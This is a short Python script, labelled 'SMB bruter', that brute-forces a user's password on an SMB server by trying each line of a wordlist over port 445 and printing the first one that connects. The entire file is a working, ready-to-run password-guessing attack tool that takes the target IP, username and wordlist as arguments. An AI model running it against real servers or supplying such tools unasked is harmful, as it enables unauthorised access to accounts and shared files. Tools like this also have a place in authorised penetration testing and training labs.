#!/usr/bin/python3
from smb.SMBConnection import SMBConnection
import argparse
import sys

parser = argparse.ArgumentParser(description="SMB bruter")
parser.add_argument("-u", type=str, required=True, help="SMB User ID")
parser.add_argument("-c", type=str, required=True, help="Client ID")
parser.add_argument("-a", type=str, required=True, help="SMB Server IP address")
parser.add_argument("-w", type=str, required=True, help="Wordlist path")
args = parser.parse_args()

try:
	password_list = open(args.w, "r", encoding="ISO-8859-1").read(). split("\n")
	for password in password_list:
		conn = SMBConnection(args.u, password, args.c, args.a)
		connection = conn.connect(args.a, 445)
		if connection:
			print(f"[+] Password found: {password}")
			sys.exit()
		else:
			print(f"[!] Password failed for: {password}")
except OSError:
	print("[!] No route to host!")
